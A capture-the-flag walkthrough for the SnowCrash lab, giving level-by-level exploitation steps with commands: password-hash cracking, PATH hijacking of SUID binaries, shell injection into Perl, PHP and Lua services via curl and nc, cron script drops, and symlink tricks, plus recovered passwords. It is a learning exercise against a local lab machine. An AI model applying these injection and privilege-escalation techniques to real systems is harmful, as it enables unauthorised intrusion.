# SnowCrash

### SSH Connection
```ssh levelXX@localhost -p 4243```

### Login steps
```
su flagXX

getflag

su levelXX
```

## Level 00
- Find files owned by flag00
```find / -group flag00 2>/dev/null```

- Cat messages
=> *cdiiddwpgswtgt*

- Decrypt with [Ceasar Cypher](https://www.dcode.fr/chiffre-cesar)
=> *nottoohardhere*

## Level 01
- Search in sensitive files
```cat /etc/passwd```
=> flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash

- John the ripper + rockyou.txt
=> 'abcdefg'

## Level 02
- file available
```level02.pcap```

- Wireshark (follow tcp stream)
```
..%..%..&..... ..#..'..$..&..... ..#..'..$.. .....#.....'........... .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm.........."........!........"..".....b........b....	B.
..............................1.......!.."......"......!..........."........"..".............	..
.....................
Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)

..wwwbugs login: l.le.ev.ve.el.lX.X
..
Password: ft_wandr...NDRel.L0L
.
..
Login incorrect
wwwbugs login:
```

- Remove backspaces ('.')
```ft_waNDReL0L```

## Level 03
- Check available binary authorization
```-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03```
=> The program is run as flag03

- Reverse available binary
=> The system call is run as flag03

- Change echo call to run a bash
```
=> Create a echo file that run a shell (/bin/bash)
=> Change Path so that echo runs the fake echo export PATH=/tmp/:$PATH
=> Run the program (so it open a bash instead of running echo)
```

## Level 04
- Available file
=> Perl file, Suid as flag04

- Perl code analisis
=> It is a CGI function linked to server on localhost:4747
```curl "http://localhost:4747/level04.pl?x=\`getflag\`"```

## Level 05
- Search files owned by group flag05
```
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

- Code Analysis
=> Runs every scripts on /opt/openarenserver and delete it

- Script  to get the flag and wait crontab to execute it
```
touch /tmp/flag.txt
chmod 777 /tmp/flag.txt
echo -e '#!/bin/sh\ngetflag > /tmp/flag.txt' > /opt/openarenaserver/exploit.sh 

watch -n 1 ls -la /opt/openarenaserver/
```
## Level 06
- Available files 
=> ```level06.php``` and binary ```level06```
	* Binary calls for php script
	* Php script modifies strings but interpret the fiven one as php code because of '/e'

- Create injection script
```
echo '[x {${`getflag`}}]' > /tmp/exploit.txt
```

# Level 07
- Available file
=> Binary SUID executed as flag07

- Change LOGNAME env variable to malicious
```export LOGNAME="coucou && getflag | cat"```

# Level 08
- Available file
=> Binary SUID executed as flag08 and token

- Code Analysis
=> Binary writes the content of the file if it does not have token in its name

- Create symlink with another name
```ln -s /home/user/level08/token /tmp/flag```

# Level 09
- Available file
=> Binary SUID executed as flag08 and token

- Code Analysis 
=> Print "You should not reverse this"

- Execution test
=> Encrypt file name but not content, add the index to the character

- Create a decryption program to decrypt token
=> f3iji1ju5yuevaus41q1afiuq

# Level 10
- Program to send file and file without access
```strace ./level10 /tmp/fake 127.0.0.1 2>&1 | grep connect```
=> Sending in port 6969

- Listen on port 6969 and run both scripts to bypass the access
=>```nc -lk 6969```

# Level 11
- Lua file available, SUID as flag11
=> Ask for Password, Hash it with from echo

- Inject Malicous line in Password
```
nc 127.0.0.1 5151
Test; getflag > /tmp/flag.txt
```

# Level 12
- Perl file available, SUID as flag12
=> Interprete agr1 as shell but after put it to upper and deleting eerything after first space

- Create a scripte and call it nypassing the restriction (upper and spaces)
=> data-urlencode allow to keep the special caracters in the parameters
```
echo "getflag > /tmp/flag" > /tmp/FLAG

curl -G  --data-urlencode 'x=";/???/FLAG;"' --data-urlencode 'y=test' 'http://localhost:4646/level12.pl'
```

# Level 13
- Binaire Suid exec as flag13
=> Reverse and with gdb and change getuid return to 4242

# Level 14
- Search for relevent file
``` find / -iname "*level14*" 2>/dev/null```
=> /run/shm/ecryptfs-level14-Private

- Search for related 'ecryptfs' files
'''find / -iname "*.ecryptfs*" 2>/dev/null'''
=>
/sbin/mount.ecryptfs
/sbin/mount.ecryptfs_private
/sbin/umount.ecryptfs
/sbin/umount.ecryptfs_private
/usr/share/man/man1/mount.ecryptfs_private.1.gz
/usr/share/man/man1/umount.ecryptfs_private.1.gz
/usr/share/man/man8/mount.ecryptfs.8.gz
/usr/share/man/man8/umount.ecryptfs.8.gz
/rofs/sbin/mount.ecryptfs
/rofs/sbin/mount.ecryptfs_private
/rofs/sbin/umount.ecryptfs
/rofs/sbin/umount.ecryptfs_private
/rofs/usr/share/man/man1/mount.ecryptfs_private.1.gz
/rofs/usr/share/man/man1/umount.ecryptfs_private.1.gz
/rofs/usr/share/man/man8/mount.ecryptfs.8.gz
/rofs/usr/share/man/man8/umount.ecryptfs.8.g